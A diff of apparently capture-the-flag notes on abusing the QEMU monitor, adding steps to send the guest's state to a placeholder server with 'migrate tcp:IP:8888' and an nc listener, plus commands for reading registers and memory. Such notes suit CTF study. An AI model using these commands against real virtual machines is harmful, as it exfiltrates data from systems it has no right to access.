@@ -1,7 +1,27 @@
 # Abusing QEMU Monitor
-^A c to toggle QEMU monitor. Then use `info registers` to get registers, `info mem` to get vmmap, `info mtree` for physical mappings, `x/gx addr` to print virtual memory and `xp/gx addr` to print physical memory
+`^A c` to toggle QEMU monitor. 
 
-If flag is in memory, this can be used to get it. Otherwise, can at least be used to get leak.
+## Using `migrate`
+If QEMU has internet access, you can use the `migrate` command to send the contents of the entire disk to your own server.
+First, listen for connections on your server
+```sh
+nc -lvnp 8888 > qemu.out
+```
+Then go into QEMU Monitor in the challenge and run
+```
+migrate tcp:IP:8888
+```
+Then you can just grep for the flag in the resulting `qemu.out` file.
+
+## Using memory access
+If you cannot get the flag with the above method, you can at least use QEMU Monitor to get direct read access to the memory.
+* `info registers` to get registers
+* `info mem` to get vmmap
+* `info mtree` for physical mappings
+* `x/gx addr` to print virtual memory
+* `xp/gx addr` to print physical memory
+
+If the flag is in memory, this can be used to get it. Otherwise, it can at least be used to get leak.
 
 # Abusing write-access
 ## Write-access to `/sbin`
